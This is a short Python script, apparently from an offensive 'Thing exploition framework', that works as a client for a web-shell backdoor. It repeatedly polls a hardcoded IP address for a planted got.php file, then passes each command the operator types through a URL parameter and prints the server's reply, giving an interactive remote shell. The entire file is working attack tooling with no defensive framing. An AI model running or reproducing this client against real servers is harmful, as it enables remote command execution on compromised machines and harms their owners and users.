#!/usr/bin/env python3
__author__      = "Joy Ghosh"
__copyright__   = "Copyright 2021, SYSTEM00 SECURITY"
__project__ = "tefw[Thing exploition framework]"
from requests import get
import time
from colorama import Fore, Back, Style
print(f'{Fore.GREEN}[=]{Fore.WHITE} Starting Backdoor listener')
def c_shell(url):
    prot,name=url.split('//')
    command=input(f'{Fore.BLUE}[{name}]{Fore.GREEN} @{Fore.RED} [GOT-SHELL]:$~ {Fore.WHITE}')
    if command=="exit":
        exit()
    else:
        resp=get(url+'/got.php?cum='+command)
        print(resp.text)
        c_shell(url)
def uest(url):
    response=get(url+"/got.php")
    if response.status_code==200:
        print('')
        print(f'{Fore.GREEN}[-Connected{Fore.RED}****{Fore.GREEN}-] {Fore.WHITE}')
        print('')
        c_shell(url)
    else:
        pass
        time.sleep(6.0)
        uest(url)

uest('http://103.147.190.100')
